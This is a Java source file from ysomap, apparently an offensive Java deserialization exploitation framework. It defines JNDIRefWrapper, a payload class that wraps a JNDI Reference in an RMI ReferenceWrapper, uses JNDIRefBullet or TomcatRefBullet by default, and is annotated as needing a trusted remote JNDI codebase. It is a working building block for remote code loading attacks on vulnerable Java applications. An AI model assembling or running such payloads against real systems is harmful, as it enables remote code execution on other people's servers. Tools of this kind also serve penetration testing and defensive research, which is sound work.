package ysomap.payloads.java.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.rmi.JNDIRefBullet;
import ysomap.common.annotation.*;
import ysomap.payloads.AbstractPayload;

import javax.naming.Reference;

/**
 * @author wh1t3P1g
 * @since 2020/2/27
 */
@SuppressWarnings({"rawtypes"})
@Payloads
@Targets({Targets.JDK, Targets.JNDI})
@Require(bullets = {"TomcatRefBullet","JNDIRefBullet"}, param = false)
@Dependencies({"allowed jndi remote codebase"})
@Authors({ Authors.WH1T3P1G })
public class JNDIRefWrapper extends AbstractPayload<ReferenceWrapper> {

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof Reference;
    }

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return new JNDIRefBullet();
    }

    @Override
    public ReferenceWrapper pack(Object obj) throws Exception {
        return new ReferenceWrapper((Reference) obj);
    }
}
